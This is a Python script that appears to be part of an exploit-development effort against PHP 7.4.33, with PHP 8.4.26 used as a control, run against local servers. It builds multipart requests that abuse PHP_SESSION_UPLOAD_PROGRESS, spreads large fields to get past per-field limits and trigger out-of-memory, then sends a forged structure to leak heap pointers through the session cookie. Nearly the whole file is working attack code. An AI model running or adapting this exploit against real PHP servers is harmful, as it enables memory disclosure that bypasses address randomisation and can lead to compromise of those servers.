"""Test multiple fields to bypass per-field limit and trigger OOM.
Per-field limit on 7.4.33: ~31MB (30MB stored, 32MB dropped).
memory_limit: 128M.
Try: 5 x 30MB = 150MB total (each < 31MB limit).
"""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

def test_multi(port, n_fields, field_mb, label):
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=180.0, verbose=False)

    # Request 1: OOM trigger with MULTIPLE smaller fields
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    for i in range(n_fields):
        parts.append({"name": f"big{i:03d}", "data": b"B" * int(field_mb * 1024 * 1024)})
    total_mb = n_fields * field_mb
    print(f"  {label}: {n_fields} x {field_mb}MB = {total_mb:.0f}MB total", flush=True)
    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST1 ERROR: {e}", flush=True)
        return False
    time.sleep(0.5)

    # Request 2: leak
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    import struct
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False
    raw = E.parse_cookie(r2)
    oom = len(raw) > 100
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk = c.most_common(1)[0][0] if c else 0
    tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
    chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
    print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
    return oom

print("=== Multi-field OOM bypass test ===", flush=True)
print("\n--- 7.4.33 (port 18108) ---", flush=True)
test_multi(18108, 5, 30, "7.4.33")
time.sleep(1)
test_multi(18108, 4, 30, "7.4.33")
time.sleep(1)
test_multi(18108, 3, 30, "7.4.33")
time.sleep(1)

print("\n--- 8.4.26 control (port 18113) ---", flush=True)
test_multi(18113, 5, 30, "8.4.26")
time.sleep(1)

print("\n=== done ===", flush=True)
